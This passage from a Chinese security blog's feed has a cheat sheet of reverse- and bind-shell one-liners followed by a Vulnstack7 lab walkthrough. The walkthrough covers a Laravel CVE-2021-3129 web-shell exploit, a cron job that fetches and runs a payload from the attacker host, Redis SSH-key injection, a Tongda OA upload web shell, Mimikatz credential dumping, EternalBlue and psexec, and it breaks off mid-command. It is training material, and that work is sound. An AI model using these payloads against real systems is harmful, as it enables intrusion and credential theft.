reGeorg</li></ul><p><strong>ssh通道</strong></p><ul><li>端口转发</li><li>socks</li></ul><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>常规shell反弹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br><br>python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f<br></code></pre></td></tr></table></figure><p>突破防火墙的imcp_shell反弹</p><p>正向shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -e /bin/sh -lp 1234<br>nc.exe -e cmd.exe -lp 1234<br></code></pre></td></tr></table></figure><h3 id="内网文件传输"><a href="#内网文件传输" class="headerlink" title="内网文件传输"></a>内网文件传输</h3><p><strong>windows下文件传输</strong></p><ul><li>powershell</li><li>vbs脚本文件</li><li>bitsadmin</li><li>文件共享</li><li>使用telnet接收数据</li><li>hta</li></ul><p><strong>linux下文件传输</strong></p><ul><li>python</li><li>wget</li><li>tar + ssh</li><li>利用dns传输数据</li></ul><p><strong>文件编译</strong></p><ul><li>powershell将exe转为txt，再txt转为exe</li></ul><h3 id="远程连接-执行程序"><a href="#远程连接-执行程序" class="headerlink" title="远程连接 &amp;&amp; 执行程序"></a>远程连接 &amp;&amp; 执行程序</h3><ul><li>at&amp;schtasks</li><li>psexec</li><li>wmic</li><li>wmiexec.vbs</li><li>smbexec</li><li>powershell remoting</li><li>SC创建服务执行</li><li>schtasks</li><li>SMB+MOF || DLL Hijacks</li><li>PTH + compmgmt.msc</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>信息收集</tag>
      
      <tag>相关指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场vulnstack7实战笔记</title>
    <link href="/2024/06/17/domain1/"/>
    <url>/2024/06/17/domain1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>靶场下载链接：</strong><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p><p><strong>参考链接：</strong><a href="https://www.freebuf.com/articles/web/354890.html">https://www.freebuf.com/articles/web/354890.html</a></p><p><strong>拓扑图：</strong></p><p><img src="/img/domain1.png" alt="domain1"></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>目标IP：</strong>192.168.40.136</p><p><strong>第一层网络DMZ-Web1（Ubuntu）：</strong></p><p>网卡1：192.168.40.136</p><p>网卡2：192.168.52.10</p><p><strong>第二层网络-Web2（Ubuntu）：</strong></p><p>网卡1：192.168.52.20</p><p>网卡2：192.168.93.10</p><p><strong>第二层网络-PC1（Windows 7）：</strong></p><p>网卡1：192.168.52.30</p><p>网科2：192.168.93.20</p><p><strong>第三层网络-PC2（Windows 7）：</strong></p><p>网卡1：192.168.93.40</p><p><strong>第三层网络-Server（Windows Server 2012）：</strong></p><p>网卡1：192.168.93.30</p><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>拿到目标IP后，使用nmap对目标IP进行常规的信息搜集</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -T4 -p<span class="hljs-number">1-65535</span> -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.40.136</span><br></code></pre></td></tr></table></figure><p><img src="/img/domain2.png" alt="domain2"></p><p>发现其81端口开放且存在<strong>Laravel</strong>框架，此外6379端口存在<strong>Redis</strong>服务</p><p>根据此处<strong>Laravel</strong>框架的版本，推测其存在<strong>CVE-2021-3129</strong>漏洞</p><p>利用<a href="https://github.com/zhzyker/CVE-2021-3129">Laravel漏洞检测工具</a>进行检测，发现其存在相关漏洞</p><p><img src="/img/domain3.png" alt="domain3"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用<a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">CVE-2021-3129的利用脚本</a>写入木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;<br><br>/*<br>system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);<br>这行命令通过 PHP 的 system 函数执行一个 shell 命令。具体命令是将字符串 PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4= 通过 base64 解码，然后将解码后的内容写入到 /var/www/html/shell.php 文件中<br><br>phar phar -o php://output<br>这部分命令的目的是将 PHAR 文件的输出内容重定向到标准输出 (php://output)<br><br>base64 -w 0<br>将上一步的输出通过 base64 编码，并且不换行 (-w 0 表示输出时不换行)<br><br>python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;<br>这部分 Python 代码从标准输入读取数据，并将每个字符转换为十六进制表示，然后格式化为 =xx=00 的形式并输出。比如字符 A 会被转换为 =41=00<br>*/<br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> Laravel_CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>_EXP.py <span class="hljs-string">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/test.php&#x27;);&quot;</span> --phar phar -o php://output | base64 -w <span class="hljs-number">0</span> | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></code></pre></td></tr></table></figure><p>直接访问192.168.40.136:81&#x2F;shell.php执行命令，可知木马写入成功</p><p><img src="/img/domain4.png" alt="domain3"></p><p>然后使用蚁剑进行连接，输入命令检测后，发现目前该shell目前是在Docker容器中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/self/cgroup<br></code></pre></td></tr></table></figure><p><img src="/img/domain5.png" alt="domain3"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>面对这种情况，需要想办法进行<strong>Docker逃逸</strong>从而获取该主机的权限，但在此之前，由于我们拿到的用户为<strong>www-data</strong>权限太小，所以我们需要进行提权</p><p>这里我们使用find命令来搜索具有SUID的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>根据上面的命令，我们可以遍历所有可执行文件，这里我们发现**&#x2F;home&#x2F;jobs<strong>目录下存在一个名为</strong>shell**的文件，且存在SUID的权限</p><p>尝试运行shell文件，可以发现其执行了ps命令，并且没有使用绝对路径，因此尝试更改**$PATH**来执行我们构造的恶意程序，从而获取更高权限的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>echo &quot;/bin/bash&quot; &gt; ps<br>chmod 777 ps<br>echo $PATH <br>export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序<br>cd /home/jobs<br>./shell<br></code></pre></td></tr></table></figure><p><img src="/img/domain6.png" alt="domain3"></p><p>之后可以使用msf生成木马，并将其上传到目标容器执行，然后使用metasploit进行反弹得到shell，具体操作如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.40.142 LPORT=4444 -f elf -o test.elf<br></code></pre></td></tr></table></figure><p>将生成的<strong>test.elf</strong>上传到服务器</p><p>然后使用<strong>msfconsole</strong>进行监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.40.142<br>set lport 4444<br>run<br></code></pre></td></tr></table></figure><p>然后运行上传到服务器的test.elf，成功得到shell</p><p><img src="/img/domain7.png" alt="domain3"></p><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><ul><li>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</li><li>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</li><li>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</li></ul><p>查看挂载目录，发现挂载有其他目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure><p>在根目录创建<strong>test</strong>目录，并将**&#x2F;dev&#x2F;sda1**挂载上去</p><p>这时我们可以通过访问容器内部的**&#x2F;test**来实现访问整台宿主机</p><p><strong>注意！在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了</strong></p><p>使用metasploit的web_delivery模块生成payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set target 7<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.40.142<br>set lport 5555<br>run<br></code></pre></td></tr></table></figure><p>将生成的命令在目标主机上执行，从而得到目标主机的<strong>meterpreter</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;* * * * * wget -qO TDkiFNiS --no-check-certificate http://192.168.40.142:8080/9eE8P9ar5J; chmod +x TDkiFNiS; ./TDkiFNiS&amp; disown&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p><img src="/img/domain8.png" alt="domain3"></p><p>通过信息搜集，我们可以得到以下有用信息：</p><ul><li>该主机系统版本为：Ubuntu 14.04</li><li>该主机存在两个内网IP：192.168.52.20 和 192.168.93.10</li></ul><p>这里会发现没有我们所访问的入口地址192.168.40.136</p><p>这边我们再尝试6379端口的<strong>redis</strong>服务，发现其存在未授权访问，直接进行连接</p><p>直接进行利用，通过在攻击机生成<strong>ssh公钥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>然后将生成的公钥导入<strong>key.txt</strong>中，再将key.txt的内容写入目标主机的redis缓冲里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt<br><br>cat key.txt | redis-cli -h 192.168.1.8 -x set xxx<br></code></pre></td></tr></table></figure><p><strong>注意！前后用\n换行，避免和Redis里其他缓存数据混合，-x 代表从标准输入读取数据作为该命令的最后一个参数</strong></p><p>然后使用攻击机连接目标的<strong>Redis</strong>，然后执行命令将<strong>ssh公钥</strong>写入目标主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/<br>config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys<br>save    # 将数据保存在目标服务器硬盘上<br></code></pre></td></tr></table></figure><p><img src="/img/domain9.png" alt="domain3"></p><p>写入后尝试连接，成功连接上目标主机</p><p><img src="/img/domain10.png" alt="domain3"></p><p>此处查看网络信息，发现也存在两个IP，192.168.40.136 和 192.168.52.10</p><p>操作系统为Ubuntu 18.04</p><p>由此可知目标的网站应该做了反向代理，此Ubuntu 18.04仅仅提供一个代理服务，真正的Web服务器在那台Ubuntu 14.04上，Ubuntu 18.04的Nginx将81端口上收到的请求转发给了内网第二层网络的Web服务器192.168.52.20也就是Ubuntu 14.04</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>在Ubuntu 18.04服务器使用earthworm搭建socks5反向代理服务，在攻击机执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./ew_for_linux64 -s rcsocks -l 1080 -e 1234<br></code></pre></td></tr></table></figure><p>在Ubuntu 18.04执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./ew_for_linux64 -s rssocks -d 192.168.40.142 -e 1234<br></code></pre></td></tr></table></figure><p>然后在攻击机修改proxychains的配置文件（一般路径在&#x2F;etc&#x2F;proxychains.conf）在文件底部修改：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks5</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>然后使用<strong>namp</strong>进行扫描，发现存在192.168.52.30主机，且开放了相关端口，在其8080端口上存在<strong>通达OA</strong>系统，将浏览器设置代理后，成功访问</p><p><img src="/img/domain11.png" alt="domain3"></p><p>通过搜索，结合网上纰漏的通达的漏洞，通过未授权登录成功获得session</p><p>之后利用文件上传漏洞，成功上传木马</p><p><strong>注意！此处我在复现过程中，需要将session修改为未授权登录所获得的session</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/im/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>679<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0nq2ah0avu1qn3ea4sheo41ha7<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">2</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;P&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">0</span>nq2ah0avu1qn3ea4sheo41ha7</span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;DEST_UID&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">1</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;ATTACHMENT&quot;</span>; filename=<span class="hljs-string">&quot;jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c &quot;</span>.<span class="hljs-variable">$command</span>);</span><br><span class="language-php"><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();</span><br><span class="language-php"><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></code></pre></td></tr></table></figure><p><img src="/img/domain12.png" alt="domain3"></p><p>再结合文件包含来执行命令，成功rce</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/interface/gateway.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.21.0<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-dockerfile">json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2407/1005700217.jpg&quot;</span>&#125;&amp;<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span></span><br></code></pre></td></tr></table></figure><p><img src="/img/domain13.png" alt="domain3"></p><p>然后尝试上线msf</p><p><img src="/img/domain14.png" alt="domain3"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set target 2<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.40.136<br>set lport 5566<br>run<br></code></pre></td></tr></table></figure><p>生成的代码直接拿去Burpsuite执行，成功上线msf，从而对目标内网进行信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /all   <span class="hljs-comment"># 查看本机ip，所在域</span><br>systeminfo      <span class="hljs-comment"># 列出系统信息</span><br>route <span class="hljs-built_in">print</span>     <span class="hljs-comment"># 打印路由信息</span><br>net view        <span class="hljs-comment"># 查看局域网内其他主机名</span><br>arp -a          <span class="hljs-comment"># 查看arp缓存</span><br><span class="hljs-built_in">whoami</span><br>net start       <span class="hljs-comment"># 查看开启了哪些服务</span><br>net share       <span class="hljs-comment"># 查看开启了哪些共享</span><br><br>net config workstation   <span class="hljs-comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br>net user                 <span class="hljs-comment"># 查看本机用户列表</span><br>net user /domain         <span class="hljs-comment"># 查看域用户</span><br>net localgroup administrators   <span class="hljs-comment"># 查看本地管理员组（通常会有域用户）</span><br>net view /domain         <span class="hljs-comment"># 查看有几个域</span><br>net user 用户名 /domain   <span class="hljs-comment"># 获取指定域用户的信息</span><br>net group /domain        <span class="hljs-comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br>net group 组名 /domain    <span class="hljs-comment"># 查看域中某工作组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain  <span class="hljs-comment"># 查看域管理员的名字</span><br>net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain  <span class="hljs-comment"># 查看域中的其他主机名</span><br>net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain  <span class="hljs-comment"># 查看域控制器（可能有多台）</span><br></code></pre></td></tr></table></figure><p>使用meterpreter上的kiwi模块成功抓取到域用户bunny和域管理员administrator的凭证</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><p><strong>注意！如果提示需要运行在x64的进程中，可以使用ps查看进程，然后使用migrate迁移进程</strong></p><p><img src="/img/domain15.png" alt="domain3"></p><h2 id="第三层网络渗透"><a href="#第三层网络渗透" class="headerlink" title="第三层网络渗透"></a>第三层网络渗透</h2><p>使用<strong>earthworm</strong>搭建一个二级socks5代理服务</p><p>首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给1235端口</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux64</span> <span class="hljs-string">-s</span> <span class="hljs-string">lcx_listen</span> <span class="hljs-string">-l</span> <span class="hljs-number">1090</span> <span class="hljs-string">-e</span> <span class="hljs-number">1235</span><br></code></pre></td></tr></table></figure><p>然后在第二层网络的Windows服务器上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s ssocksd -l <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure><p>最后，在DMZ区域的Ubuntu 18上传ew_for_linux64并利用lcx_slave方式，将攻击机的1235端口与第二层网络Windows 7的999端口连接起来</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">./ew_for_linux64 -s lcx_slave -d <span class="hljs-number">192.168.1.7</span> -e <span class="hljs-number">1235</span> -f <span class="hljs-number">192.168.52.30</span> -g <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure><p>然后配置**&#x2F;etc&#x2F;proxychains.conf**</p><p>使用nmap此93网段进行扫描，发现存在192.168.93.30和192.168.93.40这两台机器，且其445端口都开放，猜测有可能存在永恒之蓝</p><p><img src="/img/domain16.png" alt="domain3"></p><p><img src="/img/domain17.png" alt="domain3"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>对192.168.93.40进行单独扫描，发现其为Windows7且139、135、445端口均开放</p><p>尝试使用msf打永恒之蓝</p><p><strong>注意！直接在msf通过setg Proxies设置全局代理未能成功，而最终通过proxychains来运行msfconsole攻击成功</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.93.40<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/domain18.png" alt="domain3"></p><p>成功拿下</p><h2 id="域控渗透"><a href="#域控渗透" class="headerlink" title="域控渗透"></a>域控渗透</h2><p>使用psexec模块进行对域控的渗透攻击</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.93.30</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 9999</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass Whoami2021</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.93.30</span><br>run<br></code></pre></td></tr></table></figure><p>攻击失败，猜测是防火墙的问题</p><p>重新连接进192.168.52.30的shell，通过其输入用户名和密码来关掉192.168.93.30域控的防火墙</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath= <span class="hljs-string">&quot;netsh advfirewall set allprofiles state 